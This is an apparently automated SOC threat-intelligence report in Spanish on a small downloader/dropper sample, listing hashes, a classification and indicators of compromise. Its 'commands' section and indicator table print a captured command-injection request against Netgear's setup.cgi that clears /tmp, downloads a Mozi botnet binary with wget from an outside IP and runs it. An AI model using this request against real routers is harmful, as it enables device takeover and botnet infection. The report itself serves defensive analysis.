# 🧬 Payload Analysis

`b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:36+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9`
- **MD5:** `99dbfba80480bc4297d36744cd9e8af3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 177 B |
| Entropía | 5.2 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 196.191.233.XXX | static_analysis |
| url | hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| hash | b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9 | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netge | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
